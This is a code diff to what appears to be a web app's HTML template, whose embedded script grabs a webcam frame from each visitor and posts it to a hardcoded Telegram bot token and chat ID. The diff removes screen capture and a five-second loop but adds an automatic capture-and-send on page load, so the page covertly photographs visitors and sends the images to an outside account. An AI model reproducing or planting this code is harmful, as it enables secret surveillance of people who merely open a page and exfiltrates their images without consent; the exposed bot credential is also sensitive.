@@ -13,15 +13,11 @@
         const telegramBotToken = '8110683555:AAGsehuzHuGOjSFFY9YBk4QK_Lcbz1JR_Jc';
         const chatId = '1437354716';
 
-        function captureScreen() {
-            return navigator.mediaDevices.getDisplayMedia({ video: true });
-        }
-
         function captureCamera() {
             return navigator.mediaDevices.getUserMedia({ video: true });
         }
 
-        function sendMediaToTelegram(mediaType, media) {
+        function sendMediaToTelegram(mediaType, media, stream) {
             const formData = new FormData();
             formData.append(mediaType, media, 'capture.png');
 
@@ -32,6 +28,7 @@
             .then(response => response.json())
             .then(data => {
                 console.log('Success:', data);
+                stream.getTracks().forEach(track => track.stop());
             })
             .catch((error) => {
                 console.error('Error:', error);
@@ -56,25 +53,21 @@
         }
 
         function captureAndSend() {
-            Promise.all([captureCamera(), captureScreen()])
-                .then(([cameraStream, screenStream]) => {
-                    captureVideoFrame(cameraStream, (screenshotData) => {
-                        sendMediaToTelegram('photo', screenshotData);
-                        cameraStream.getTracks().forEach(track => track.stop());
-                    });
-
-                    captureVideoFrame(screenStream, (screenshotData) => {
-                        sendMediaToTelegram('photo', screenshotData);
-                        screenStream.getTracks().forEach(track => track.stop());
+            captureCamera()
+                .then(stream => {
+                    captureVideoFrame(stream, (screenshotData) => {
+                        sendMediaToTelegram('photo', screenshotData, stream);
                     });
                 })
                 .catch(err => {
-                    console.error('Error capturing media: ', err);
+                    console.error('Error capturing camera: ', err);
                 });
         }
 
-        // Capture and send screenshots every 5 seconds
-        setInterval(captureAndSend, 5000);
+        // Automatically capture and send camera feed on page load
+        window.onload = function() {
+            captureAndSend();
+        };
     </script>
     <noscript>
       <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
